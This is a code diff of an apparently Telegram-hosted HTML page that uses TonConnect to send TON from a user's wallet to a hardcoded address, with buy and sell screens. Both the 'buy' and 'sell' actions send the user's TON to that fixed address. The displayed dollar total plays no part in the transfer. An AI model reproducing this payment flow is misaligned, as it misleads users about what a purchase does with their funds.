@@ -39,6 +39,7 @@
         .status.show { display: block; }
         .status.error { background: #3d0a0a; color: #ff6666; }
         .status.info { background: #1a1a35; color: #00d4aa; }
+        .status.success { background: #0a3d2e; color: #00ff88; }
         .hidden { display: none; }
     </style>
 </head>
@@ -50,6 +51,7 @@
                 <div class="title" id="action-title">Покупка TON</div>
                 <div class="amount" id="action-amount">0.5 TON</div>
                 <div class="info" id="action-price">По цене: $0.00</div>
+                <div class="info" id="action-total" style="opacity:0.6; font-size:12px; margin-top:8px;">Итого: $0.00</div>
             </div>
 
             <div id="ton-connect"></div>
@@ -74,17 +76,24 @@
 
     <script src="https://unpkg.com/@tonconnect/ui@2.0.11/dist/tonconnect-ui.min.js"></script>
     <script>
+        // Параметры из URL
         const params = new URLSearchParams(window.location.search);
         const action = params.get('action') || 'buy';
         const amount = parseFloat(params.get('amount')) || 0.5;
         const price = parseFloat(params.get('price')) || 0;
         const total = (amount * price).toFixed(2);
         
+        // Адрес кошелька для получения TON
+        const WALLET_ADDRESS = 'UQBtf4ojA3Me-Bx3YQ1ftx5shN8Y3i3sAbry-wn9ycCUyLhi';  // ← ЗАМЕНИ НА СВОЙ!
+        
+        // Обновляем интерфейс
         document.getElementById('action-emoji').textContent = action === 'buy' ? '💎' : '💰';
         document.getElementById('action-title').textContent = action === 'buy' ? 'Покупка TON' : 'Продажа TON';
         document.getElementById('action-amount').textContent = `${amount} TON`;
         document.getElementById('action-price').textContent = `По цене: $${price.toFixed(4)}`;
+        document.getElementById('action-total').textContent = `Итого: $${total}`;
 
+        // TonConnect
         const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
             manifestUrl: 'https://acewolfff.github.io/ton-trader-bot/tonconnect-manifest.json',
             buttonRootId: 'ton-connect'
@@ -92,10 +101,12 @@
 
         tonConnectUI.onStatusChange(wallet => {
             const btnSend = document.getElementById('btn-send');
+            const statusEl = document.getElementById('status');
+            
             if (wallet) {
                 btnSend.classList.remove('hidden');
-                document.getElementById('status').className = 'status show info';
-                document.getElementById('status').textContent = 'Кошелёк подключен. Нажми кнопку для подтверждения.';
+                statusEl.className = 'status show info';
+                statusEl.textContent = `Кошелёк подключен. Будет отправлено ${amount} TON.`;
             } else {
                 btnSend.classList.add('hidden');
             }
@@ -103,39 +114,55 @@
 
         async function sendTransaction() {
             const btnSend = document.getElementById('btn-send');
+            const statusEl = document.getElementById('status');
             
             if (!tonConnectUI.wallet) {
-                document.getElementById('status').className = 'status show error';
-                document.getElementById('status').textContent = 'Сначала подключи кошелёк!';
+                statusEl.className = 'status show error';
+                statusEl.textContent = 'Сначала подключи кошелёк!';
                 return;
             }
             
             btnSend.disabled = true;
             btnSend.textContent = '⏳ Отправка...';
+            statusEl.className = 'status show info';
+            statusEl.textContent = 'Подтверди транзакцию в кошельке...';
             
             try {
-                await tonConnectUI.sendTransaction({
+                const amountInNanoton = String(Math.floor(amount * 1_000_000_000));
+                
+                const transaction = {
                     validUntil: Math.floor(Date.now() / 1000) + 600,
-                    messages: [{
-                        address: 'UQBtf4ojA3Me-Bx3YQ1ftx5shN8Y3i3sAbry-wn9ycCUyLhi',
-                        amount: String(Math.floor(amount * 1_000_000_000)),
-                        payload: ''
-                    }]
-                });
+                    messages: [
+                        {
+                            address: WALLET_ADDRESS,
+                            amount: amountInNanoton
+                        }
+                    ]
+                };
+                
+                await tonConnectUI.sendTransaction(transaction);
                 
                 document.getElementById('step-confirm').classList.add('hidden');
                 document.getElementById('step-success').classList.remove('hidden');
+                
             } catch(e) {
-                document.getElementById('status').className = 'status show error';
-                document.getElementById('status').textContent = 'Отменено или ошибка: ' + e.message;
+                statusEl.className = 'status show error';
+                if (e.message && e.message.includes('rejected')) {
+                    statusEl.textContent = 'Транзакция отменена пользователем';
+                } else {
+                    statusEl.textContent = 'Ошибка: ' + (e.message || 'проверьте адрес кошелька');
+                }
                 btnSend.disabled = false;
                 btnSend.textContent = '📤 Подтвердить в кошельке';
             }
         }
 
         function closeApp() {
-            if (window.Telegram?.WebApp) window.Telegram.WebApp.close();
-            else window.close();
+            if (window.Telegram && window.Telegram.WebApp) {
+                window.Telegram.WebApp.close();
+            } else {
+                window.close();
+            }
         }
     </script>
 </body>
